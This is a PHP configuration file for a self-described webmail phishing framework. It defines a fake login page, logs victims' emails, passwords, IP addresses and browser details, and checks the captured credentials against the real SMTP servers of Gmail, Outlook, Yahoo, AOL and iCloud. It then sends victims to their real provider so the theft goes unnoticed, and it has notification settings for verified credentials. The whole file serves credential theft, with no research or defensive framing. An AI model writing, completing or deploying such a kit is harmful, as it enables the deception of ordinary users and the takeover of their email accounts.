<?php
/**
 * Webmail Phishing Framework Configuration
 * Customize these settings for your specific needs
 */

// System Configuration
define('LOG_DIR', 'captured_logs');
define('VERIFICATION_LOG_DIR', 'verification_logs');
define('MAX_LOGIN_ATTEMPTS', 3);
define('ENABLE_SMTP_VERIFICATION', false); // Set to true to enable real SMTP verification
define('DEBUG_MODE', false);

// SMTP Configuration
$smtp_config = [
    'timeout' => 10,
    'verify_ssl' => false,
    'common_ports' => [587, 25, 465, 993, 995, 143, 110],
    'enable_debug' => false
];

// Email Provider Configurations
$email_providers = [
    'gmail.com' => [
        'smtp' => 'smtp.gmail.com',
        'ports' => [587, 465],
        'tls' => true,
        'redirect_url' => 'https://accounts.google.com'
    ],
    'outlook.com' => [
        'smtp' => 'smtp-mail.outlook.com',
        'ports' => [587],
        'tls' => true,
        'redirect_url' => 'https://outlook.live.com'
    ],
    'hotmail.com' => [
        'smtp' => 'smtp-mail.outlook.com',
        'ports' => [587],
        'tls' => true,
        'redirect_url' => 'https://outlook.live.com'
    ],
    'yahoo.com' => [
        'smtp' => 'smtp.mail.yahoo.com',
        'ports' => [587, 465],
        'tls' => true,
        'redirect_url' => 'https://mail.yahoo.com'
    ],
    'aol.com' => [
        'smtp' => 'smtp.aol.com',
        'ports' => [587],
        'tls' => true,
        'redirect_url' => 'https://mail.aol.com'
    ],
    'icloud.com' => [
        'smtp' => 'smtp.mail.me.com',
        'ports' => [587],
        'tls' => true,
        'redirect_url' => 'https://www.icloud.com/mail'
    ]
];

// Interface Customization
$interface_config = [
    'site_title' => 'Webmail Login',
    'company_name' => 'Your Organization',
    'logo_url' => '', // Leave empty for default
    'primary_color' => '#4f46e5',
    'secondary_color' => '#7c3aed',
    'background_gradient' => 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
    'show_powered_by' => true
];

// Security Settings
$security_config = [
    'enable_ip_logging' => true,
    'enable_user_agent_logging' => true,
    'block_duplicate_submissions' => true,
    'session_timeout' => 3600, // 1 hour
    'rate_limit_attempts' => 5,
    'rate_limit_window' => 300 // 5 minutes
];

// Notification Settings (for future implementation)
$notification_config = [
    'enable_email_notifications' => false,
    'notification_email' => '',
    'enable_webhook_notifications' => false,
    'webhook_url' => '',
    'notify_on_verified_credentials' => true,
    'notify_on_all_attempts' => false
];

// Error Messages
$error_messages = [
    'invalid_credentials' => 'Invalid email or password. Please try again.',
    'missing_fields' => 'Please enter both email and password.',
    'invalid_email' => 'Please enter a valid email address.',
    'too_many_attempts' => 'Too many failed attempts. Redirecting to your email provider...',
    'server_error' => 'A server error occurred. Please try again later.',
    'verification_failed' => 'Could not verify your credentials at this time.'
];

// Success Messages
$success_messages = [
    'redirecting' => 'Authentication successful. Redirecting...',
    'credentials_verified' => 'Credentials verified successfully.',
    'processing' => 'Processing your request...'
];

// Logging Configuration
$logging_config = [
    'log_format' => 'json', // json or plain
    'separate_domain_logs' => true,
    'separate_verified_logs' => true,
    'log_rotation' => [
        'enabled' => true,
        'max_file_size' => 10485760, // 10MB
        'max_files' => 10
    ],
    'fields_to_log' => [
        'timestamp',
        'ip_address',
        'user_agent',
        'email',
        'password',
        'domain',
        'attempt_number',
        'verification_status',
        'session_id',
        'referrer'
    ]
];

// Development Settings
$dev_config = [
    'enable_test_mode' => false,
    'test_credentials' => [
        'test@example.com' => 'password123'
    ],
    'bypass_smtp_verification' => true,
    'show_debug_info' => false
];

/**
 * Helper function to get configuration value
 */
function getConfig($section, $key = null, $default = null) {
    global ${$section . '_config'};
    $config = ${$section . '_config'} ?? [];
    
    if ($key === null) {
        return $config;
    }
    
    return $config[$key] ?? $default;
}

/**
 * Helper function to check if a feature is enabled
 */
function isFeatureEnabled($feature) {
    switch ($feature) {
        case 'smtp_verification':
            return ENABLE_SMTP_VERIFICATION;
        case 'debug_mode':
            return DEBUG_MODE;
        case 'test_mode':
            return getConfig('dev', 'enable_test_mode', false);
        default:
            return false;
    }
}

/**
 * Helper function to get provider configuration
 */
function getProviderConfig($domain) {
    global $email_providers;
    return $email_providers[$domain] ?? null;
}

/**
 * Helper function to ensure log directories exist
 */
function ensureLogDirectories() {
    if (!file_exists(LOG_DIR)) {
        mkdir(LOG_DIR, 0755, true);
    }
    if (!file_exists(VERIFICATION_LOG_DIR)) {
        mkdir(VERIFICATION_LOG_DIR, 0755, true);
    }
}

/**
 * Initialize configuration
 */
function initConfig() {
    ensureLogDirectories();
    
    // Set error reporting based on debug mode
    if (isFeatureEnabled('debug_mode')) {
        error_reporting(E_ALL);
        ini_set('display_errors', 1);
    } else {
        error_reporting(0);
        ini_set('display_errors', 0);
    }
}

// Auto-initialize when config is loaded
initConfig();
?>